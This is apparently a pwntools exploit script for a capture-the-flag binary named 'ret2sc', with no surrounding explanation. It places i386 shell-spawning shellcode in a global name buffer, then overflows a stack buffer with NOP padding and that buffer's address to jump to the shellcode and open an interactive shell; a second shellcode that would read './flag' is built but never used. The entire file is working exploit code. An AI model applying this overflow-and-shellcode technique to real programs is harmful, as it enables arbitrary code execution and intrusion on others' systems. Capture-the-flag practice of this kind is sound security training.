from pwn import*
context(arch='i386',os='linux')
context.log_level = 'debug'
r = process('./ret2sc')
gdb.attach(r)
shellcode = ''
shellcode += shellcraft.pushstr('./flag')
shellcode += shellcraft.open('esp',0,0)
shellcode += shellcraft.read('eax','esp',100)
shellcode += shellcraft.write(1,'eax',100)

shellcode2 = shellcraft.i386.sh()

name_bss = 0x0804a060

payload = ''
payload += '\x90'*(0x1c+4)
payload += p32(name_bss)

r.recvuntil('Name:')
r.sendline(asm(shellcode2))

r.recvuntil('best:')
r.sendline(payload)

r.interactive()
